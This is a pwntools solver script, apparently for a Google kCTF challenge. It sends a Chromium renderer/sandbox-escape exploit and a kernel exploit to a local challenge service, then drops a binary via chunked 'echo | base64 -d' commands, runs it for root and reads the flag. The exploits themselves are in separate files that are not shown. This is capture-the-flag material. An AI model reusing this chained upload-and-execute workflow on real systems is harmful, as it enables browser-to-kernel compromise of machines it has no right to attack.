#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
import os

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

  
script_path = os.path.dirname(os.path.realpath(__file__))

with open(os.path.join(script_path, 'chromium_exploit.html'), 'rb') as f:
  data = b64e(f.read())

with open(os.path.join(script_path, 'kernel_exploit.gz'), 'rb') as f:
  kdata = f.read()

r = remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

with log.progress('Uploading Chromium exploit'):
  r.sendlineafter('How many bytes is your base64-encoded exploit?', str(len(data)))
  r.sendlineafter('Give me your exploit as base64!', data)
  r.recvuntil("Let's go")

with log.progress('Waiting for VM to boot...'):
  r.recvuntil('DevTools listening')

with log.progress('Exploiting renderer...'):
  r.recvuntil('Got Mojo')

with log.progress('Escaping sandbox...'):
  r.recvuntil('$ ')

r.sendline()

chunk_size = 128
with log.progress('Uploading kernel exploit...') as p:
  for i in range(0, len(kdata), chunk_size):
    c = b64e(kdata[i:i+chunk_size])
    r.sendlineafter('$', 'echo %s | base64 -d >> /tmp/pwn.gz' % c)
    p.status(f'{100 * i // len(kdata)}%')

with log.progress('Getting root....') as p:
  r.sendlineafter('$ ', 'cd /tmp')
  r.sendlineafter('$ ', 'gunzip pwn.gz')
  r.sendlineafter('$ ', 'chmod +x pwn')
  r.sendlineafter('$ ', './pwn')

r.sendlineafter('$ ', 'cat flag')

r.recvline()
print(r.recvregex(r'CTF{.*}'))

exit(0)
